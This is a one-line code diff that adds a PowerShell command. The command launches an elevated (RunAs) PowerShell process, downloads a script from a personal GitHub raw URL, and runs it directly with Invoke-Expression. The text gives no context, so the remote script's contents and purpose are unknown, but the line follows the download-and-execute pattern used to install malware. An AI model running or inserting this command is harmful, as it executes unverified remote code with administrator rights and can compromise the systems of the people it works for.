@@ -1,0 +1,1 @@
+powershell Start-Process "powershell ""`$url = 'https://raw.githubusercontent.com/kalebodonnell/NC/master/polp.ps1';IEX (New-Object Net.WebClient).DownloadString(`$url)"""  -Verb RunAs
